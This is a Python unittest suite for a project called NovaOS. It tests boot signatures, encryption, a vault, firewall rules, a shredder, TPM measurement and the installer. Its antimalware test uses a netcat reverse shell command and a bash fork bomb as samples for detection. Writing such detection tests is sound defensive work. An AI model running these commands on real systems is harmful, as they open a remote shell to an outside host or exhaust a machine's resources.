"""
NovaOS Automated Quality, Security & Compliance Test Suite
Validates bootloader binaries, ISO 9660 El Torito images, cryptographic operations,
antimalware heuristics, firewall policies, and installer deployment.
"""

import os
import sys
import tempfile
import unittest

REPO_ROOT = os.path.abspath(os.path.join(os.path.dirname(__file__), ".."))
if REPO_ROOT not in sys.path:
    sys.path.insert(0, REPO_ROOT)

from security.crypto_engine import NovaCryptoEngine
from security.vault import NovaVault
from security.defender import NovaDefender, ThreatLevel
from security.firewall import NovaWall
from security.shredder import NovaShredder
from kernel.sysinfo import NovaSysInfo
from kernel.integrity import IntegrityMonitor
from installer.disk import NovaDiskManager
from installer.deploy import NovaDeployer

class TestNovaOS(unittest.TestCase):

    def test_bootloader_mbr_signature(self):
        """Verify MBR Stage 1 boot sector has valid 0xAA55 signature at offset 510."""
        mbr_path = os.path.join(REPO_ROOT, "boot", "bootsector.bin")
        self.assertTrue(os.path.exists(mbr_path), "bootsector.bin must exist")
        size = os.path.getsize(mbr_path)
        self.assertGreaterEqual(size, 512, f"MBR bootloader must be at least 512 bytes, got {size}")
        with open(mbr_path, "rb") as f:
            data = f.read()
            self.assertEqual(data[510:512], b"\x55\xaa", "Missing 0xAA55 boot signature at offset 510")

    def test_uefi_pe_binary(self):
        """Verify BOOTX64.EFI is a valid PE32+ executable."""
        efi_path = os.path.join(REPO_ROOT, "boot", "BOOTX64.EFI")
        self.assertTrue(os.path.exists(efi_path), "BOOTX64.EFI must exist")
        with open(efi_path, "rb") as f:
            hdr = f.read(2)
            self.assertEqual(hdr, b"MZ", "UEFI binary must start with DOS/MZ header")
            f.seek(0x3C)
            pe_offset = int.from_bytes(f.read(4), "little")
            f.seek(pe_offset)
            pe_sig = f.read(4)
            self.assertEqual(pe_sig, b"PE\x00\x00", "Must have valid PE signature")

    def test_crypto_roundtrip_aes256_gcm(self):
        """Test AES-256-GCM authenticated encryption and decryption."""
        passphrase = "UltraSecretKey2026!"
        secret = b"NovaOS Confidential Kernel Memory Payload"
        
        encrypted = NovaCryptoEngine.encrypt_data(secret, passphrase)
        self.assertEqual(encrypted["cipher"], "AES-256-GCM")
        self.assertIn("salt", encrypted)
        self.assertIn("nonce", encrypted)
        self.assertIn("ciphertext", encrypted)

        decrypted = NovaCryptoEngine.decrypt_data(encrypted, passphrase)
        self.assertEqual(decrypted, secret)

    def test_bitlocker_recovery_key_format(self):
        """Test 48-digit Windows 11 BitLocker recovery key generation."""
        key = NovaCryptoEngine.generate_recovery_key()
        parts = key.split("-")
        self.assertEqual(len(parts), 8, "BitLocker key must contain 8 groups")
        for p in parts:
            self.assertEqual(len(p), 6, "Each group must be 6 digits")
            self.assertTrue(p.isdigit(), "Each group must be numeric")

    def test_vault_operations(self):
        """Test BitLocker Neo encrypted vault creation, locking, and recovery."""
        with tempfile.NamedTemporaryFile(suffix=".nvault", delete=False) as tmp:
            tmp_path = tmp.name

        try:
            vault = NovaVault(vault_path=tmp_path)
            rec_key = vault.initialize("VaultPin1234!")
            self.assertTrue(vault.is_unlocked)
            vault.write_file("secrets.txt", b"Quantum Encryption Key: 0x99AA")

            # Lock vault
            vault.lock()
            self.assertFalse(vault.is_unlocked)
            self.assertEqual(len(vault.files), 0)

            # Unlock with Recovery Key
            vault2 = NovaVault(vault_path=tmp_path)
            unlocked = vault2.unlock(rec_key)
            self.assertTrue(unlocked)
            self.assertEqual(vault2.read_file("secrets.txt"), b"Quantum Encryption Key: 0x99AA")
        finally:
            if os.path.exists(tmp_path):
                os.remove(tmp_path)

    def test_defender_antimalware(self):
        """Test Nova Defender heuristic rule detection."""
        defender = NovaDefender()
        
        # Test clean content
        clean_res = defender.scan_content("safe.sh", "#!/bin/bash\necho 'Hello World'\n")
        self.assertFalse(clean_res["threat_detected"])

        # Test reverse shell pattern
        mal_res = defender.scan_content("hack.sh", "nc -e /bin/bash 192.168.1.50 4444")
        self.assertTrue(mal_res["threat_detected"])
        self.assertEqual(mal_res["threat_level"], ThreatLevel.CRITICAL)

        # Test fork bomb pattern
        dos_res = defender.scan_content("bomb.sh", ":(){ :|:& };:")
        self.assertTrue(dos_res["threat_detected"])

    def test_firewall_zero_trust(self):
        """Test NovaWall zero-trust packet filter."""
        fw = NovaWall()
        self.assertTrue(fw.enabled)
        # Outbound HTTPS allowed
        self.assertEqual(fw.evaluate_packet("OUTBOUND", 443, "TCP"), "ALLOW")
        # Inbound SSH blocked by default
        self.assertEqual(fw.evaluate_packet("INBOUND", 22, "TCP"), "BLOCK")
        # Inbound unknown port dropped by zero trust
        self.assertEqual(fw.evaluate_packet("INBOUND", 9999, "TCP"), "DROP")

    def test_shredder_dod_compliance(self):
        """Test DoD 5220.22-M 7-pass file shredder."""
        with tempfile.NamedTemporaryFile(delete=False) as f:
            f.write(b"Top secret military intelligence data")
            tmp_path = f.name

        self.assertTrue(os.path.exists(tmp_path))
        shredded = NovaShredder.shred_file(tmp_path, passes=7)
        self.assertTrue(shredded)
        self.assertFalse(os.path.exists(tmp_path), "File must be removed after 7-pass shred")

    def test_measured_boot_integrity(self):
        """Test TPM 2.0 PCR register calculation and chain of custody."""
        monitor = IntegrityMonitor()
        pcr0_initial = monitor.pcr_registers[0]
        monitor.extend_pcr(0, b"UEFI_BIOS_FIRMWARE_PAYLOAD", "UEFI measurement")
        self.assertNotEqual(monitor.pcr_registers[0], pcr0_initial)
        st = monitor.verify_system_state()
        self.assertEqual(st["status"], "SECURE")
        self.assertEqual(st["tpm_attestation"], "PASSED")

    def test_installer_gpt_and_deployment(self):
        """Test GPT partition generator and automated deployment simulation."""
        layout = NovaDiskManager.generate_gpt_layout("/dev/nvme0n1", full_disk_encryption=True)
        self.assertEqual(len(layout), 3)
        self.assertEqual(layout[0]["flags"], ["boot", "esp"])
        self.assertTrue(layout[2]["encrypted"])

        rec_key = NovaDeployer.execute_installation(
            target_disk="/dev/nvme0n1",
            username="NovaAdmin",
            passphrase="SuperSecurePassword2026!",
            security_level="Zero-Trust"
        )
        self.assertEqual(len(rec_key.split("-")), 8)

    def test_iso_image_generated(self):
        """Test presence and checksum of the bootable ISO image."""
        iso_path = os.path.join(REPO_ROOT, "dist", "NovaOS-v1.0-x86_64-LiveCD.iso")
        self.assertTrue(os.path.exists(iso_path), "NovaOS-v1.0-x86_64-LiveCD.iso must exist")
        self.assertGreater(os.path.getsize(iso_path), 1000000, "ISO must be larger than 1MB")
        sha_path = os.path.join(REPO_ROOT, "dist", "SHA256SUMS")
        self.assertTrue(os.path.exists(sha_path))

if __name__ == "__main__":
    unittest.main()
